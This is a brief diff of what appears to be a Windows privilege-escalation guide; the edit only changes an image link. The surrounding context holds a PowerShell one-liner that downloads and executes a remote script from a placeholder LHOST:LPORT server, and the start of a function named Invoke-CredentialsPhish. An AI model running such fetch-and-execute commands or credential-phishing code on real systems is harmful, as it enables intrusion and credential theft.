@@ -37,7 +37,7 @@ Import the script from a web server.
 C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-PrivescCheck.ps1'); Invoke-PrivescCheck" 
 ```
 
-[!](https://i0.wp.com/1.bp.blogspot.com/-vWTZFXpgriQ/XpXLWa3sWUI/AAAAAAAAjjg/BzDVi7-8N9U9mSx8TYYYCeSuAwDKjn2rACLcBGAsYHQ/s1600/19.png)
+[!](https://1.bp.blogspot.com/-vWTZFXpgriQ/XpXLWa3sWUI/AAAAAAAAjjg/BzDVi7-8N9U9mSx8TYYYCeSuAwDKjn2rACLcBGAsYHQ/s1600/19.png)
 
 ```
 function Invoke-CredentialsPhish
